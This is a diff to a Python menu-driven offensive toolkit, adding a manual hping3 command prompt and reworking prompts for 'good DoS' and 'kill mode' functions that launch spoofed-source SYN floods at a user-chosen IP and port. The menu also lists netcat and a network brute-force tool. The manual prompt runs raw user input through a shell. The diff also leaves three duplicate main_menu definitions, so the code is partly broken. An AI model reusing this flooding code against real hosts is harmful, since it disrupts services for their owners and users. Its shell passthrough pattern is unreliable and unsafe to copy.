@@ -1213,10 +1213,6 @@ def netcat_menu():
         else:
             print("Invalid choice. Please try again.")
 
-def signal_handler(sig, frame):
-    print("\nExiting...")
-    sys.exit(0)
-
 def clear_screen():
     print("\033[H\033[J", end="")  
 
@@ -1225,6 +1221,19 @@ def signal_handler(sig, frame):
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
+
+def manual_hping3_command():
+    """
+    Allows the user to enter custom hping3 commands manually.
+    """
+    try:
+        while True:
+            command = input("Enter an hping3 command (or press Enter to return to the menu): ").strip()
+            if not command:
+                break
+            subprocess.run(command, shell=True)
+    except KeyboardInterrupt:
+        print("\nReturning to the menu.")
 
 def run_hping3_good_dos(target_ip, target_port, threads):
     command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
@@ -1244,21 +1253,17 @@ def run_hping3_good_dos_prompt():
     while True:
         try:
             target_ip = input("Enter the target IP address: ").strip()
-            
             target_port = input("Enter the port number (e.g., 80): ").strip()
-
-            threads = int(input("Enter the number of threads (80, 100, 150, 250): ").strip())
+            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
 
             if threads in [20, 50, 100, 250, 500, 1000]:
                 run_hping3_good_dos(target_ip, target_port, threads)
             else:
-                print("Invalid thread count. Please enter one of the allowed values: 80, 100, 150, 250.")
+                print("Invalid thread count. Please enter one of the allowed values.")
                 continue
-        
         except Exception as e:
             print(f"Error running command: {e}")
         
-        # Option to stop or continue
         cont = input("Do you want to run another attack? (y/n): ").strip().lower()
         if cont != 'y':
             print("Returning to the menu...")
@@ -1269,15 +1274,13 @@ def run_hping3_kill_mode_prompt():
         try:
             target_ip = input("Enter the target IP address: ").strip()
             target_port = input("Enter the port number (e.g., 80): ").strip()
+            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
 
-            threads = int(input("Enter the number of threads (100, 250, 500, 1000): ").strip())
-
-            if threads in [20, 50, 80, 90, 100, 250, 500, 1000]:
+            if threads in [20, 50, 100, 250, 500, 1000]:
                 run_hping3_kill_mode(target_ip, target_port, threads)
             else:
-                print("Invalid thread count. Please enter one of the allowed values: 100, 250, 500, 1000.")
+                print("Invalid thread count. Please enter one of the allowed values.")
                 continue
-        
         except Exception as e:
             print(f"Error running command: {e}")
         
@@ -1297,7 +1300,7 @@ def hping3_menu():
         choice = input("Choose an option: ")
 
         if choice == "1":
-            run_hping3_manual()
+            manual_hping3_command()
         elif choice == "2":
             run_hping3_good_dos_prompt()
         elif choice == "3":
@@ -1307,12 +1310,12 @@ def hping3_menu():
         else:
             print("Invalid choice, please try again.")
 
-
+# Main Menu
 def main_menu():
     while True:
         clear_screen()
         print("\nMain Menu:")
-        print("1. Run Hping3")
+        print("1. Hping3 Menu")
         print("2. Exit")
 
         choice = input("Choose an option: ")
@@ -1324,6 +1327,39 @@ def main_menu():
             break
         else:
             print("Invalid choice, please try again.")
+def whois_lookup():
+    try:
+        ip_address = input("Enter an IP address for WHOIS lookup: ").strip()
+        if ip_address:
+            print("\nPerforming WHOIS lookup...\n")
+            # Use subprocess to call the whois command
+            result = subprocess.run(["whois", ip_address], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if result.returncode == 0:
+                print(result.stdout)  # Print the output of the whois command
+            else:
+                print(f"Error: {result.stderr.strip()}")
+        else:
+            print("No IP address entered.")
+    except KeyboardInterrupt:
+        print("\nWHOIS lookup canceled.")
+    input("\nPress Enter to return to the menu.")
+
+def main_menu():
+    while True:
+        print("\nMain Menu:")
+        print("1. WHOIS Lookup")
+        print("2. Exit")
+
+        choice = input("Choose an option: ")
+
+        if choice == "1":
+            whois_lookup()
+        elif choice == "2":
+            print("Exiting...")
+            break
+        else:
+            print("Invalid choice, please try again.")
+
 def main_menu():
     while True:
         show_main_menu_logo()
@@ -1344,6 +1380,7 @@ def main_menu():
             "[9] netcat",
             "[15] hostname to private ip",
             "[25] network brute force tool / cerbrutus",
+            "[WHOIS]",
             "[6] Update Script",
             "[99] To Exit",
             "[21] Hping3 Ddos Packets / ip ddos",
@@ -1389,6 +1426,8 @@ def main_menu():
              ping_ip()
         elif choice == '21':
             hping3_menu()
+        elif choice == 'whois':
+            whois_lookup()
         elif choice == '99':
             exiting_loading_screen()
         else:
